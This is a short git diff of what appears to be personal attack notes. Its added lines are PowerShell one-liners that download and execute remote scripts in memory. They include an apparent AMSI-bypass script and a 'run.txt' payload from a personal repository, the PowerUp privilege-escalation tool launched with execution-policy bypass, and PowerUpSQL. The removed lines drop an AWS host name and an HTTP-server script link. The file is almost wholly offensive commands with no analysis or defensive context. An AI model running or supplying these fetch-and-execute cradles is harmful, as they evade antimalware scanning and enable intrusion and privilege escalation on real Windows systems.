@@ -1,9 +1,23 @@
-ec2-3-9-48-179.eu-west-2.compute.amazonaws.com
+Open Powershell
 
 
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/amsi.txt')
+
+
+Escalation 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
+
+powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+
+
+
+
+
+
 IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/run.txt')
 
-https://gist.githubusercontent.com/zhilich/b8480f1d22f9b15d4fdde07ddc6fa4ed/raw/8078a51bbfa18df36d8e890fefe96a06891dd47d/SimpleHttpServer.ps1
 
 
+SQL 
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
